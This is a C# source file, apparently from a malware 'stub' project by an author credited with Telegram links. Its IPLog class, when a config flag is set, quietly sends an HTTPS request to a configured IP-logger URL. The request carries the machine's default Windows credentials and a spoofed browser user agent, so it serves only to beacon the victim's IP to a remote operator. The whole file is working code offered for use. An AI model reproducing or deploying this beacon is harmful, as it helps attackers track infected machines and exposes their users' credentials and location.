/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System;
using System.Net;

namespace stubOnion
{
    class IPLog
    {
       public static void GetIP()
        {

            if (Config.logger == "1")
                GetIPlog();
        }
        public static void GetIPlog()
        {

            var Str = Config.urllogger;
            if (CheckURLValid(Str))
            {
                GetIP(Str);
            }
            else
            {
            }
        }



        private static bool CheckURLValid(string source) =>
            Uri.TryCreate(source, UriKind.Absolute, out Uri uriResult) && uriResult.Scheme == Uri.UriSchemeHttps;

        private static bool GetIP(string Url)
        {
            try
            {
                var request = WebRequest.Create(Url);
                request.Credentials = CredentialCache.DefaultCredentials;
                request.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
                using (WebResponse response = request.GetResponse())
                {
                    return true;
                }
            }
            catch { return false; }
        }
    }
}
